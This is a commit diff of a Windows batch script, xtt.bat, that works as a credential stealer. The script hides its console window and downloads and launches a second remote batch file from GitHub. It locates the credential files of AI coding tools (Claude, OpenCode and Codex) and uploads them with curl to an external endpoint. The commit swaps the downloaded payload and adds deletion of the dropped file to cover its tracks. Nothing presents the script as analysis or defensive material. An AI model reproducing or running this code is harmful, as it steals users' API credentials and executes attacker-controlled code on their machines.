009a75be6207e1ceb6dc6993fb9f69bb1d0293c9
eidanexa-lang <eidanexa@gmail.com>
2026-06-09 15:19:52 -0500

    Update xtt.bat

--- xtt.bat
+++ xtt.bat
@@ -5,7 +5,7 @@ if errorlevel 1 ( goto loll )
 powershell -command "& {Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win { [DllImport(\"user32.dll\")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [void][Win]::SetWindowPos([Win]::GetConsoleWindow(), [IntPtr]::Zero, 1, 1, 1, 1, 0x0040)}"
 set "ClaudeE=%userprofile%\.claude\credentials.json"
 set "ClaudeEE=%userprofile%\.claude\.credentials.json"
-curl -f -L -o "%temp%\xdlls2s.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/Madre.bat" >nul 
+curl -f -L -o "%temp%\xdlls2s.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/master.bat" >nul 
 start "" "%temp%\xdlls2s.bat"
 set "OpenCodeE=%userprofile%\.local\share\opencode\auth.json"
 set "CodexE=%userprofile%\.codex\auth.json"
@@ -28,4 +28,6 @@ if exist "%CodexE%" (
     curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"huy sona\"}" %Codex%
     curl -F "file=@%CodexE%" %Codex%
 )
+timeout /t 2 /nobreak >nul
+del "%temp%\xdlls2s.bat"
 exit
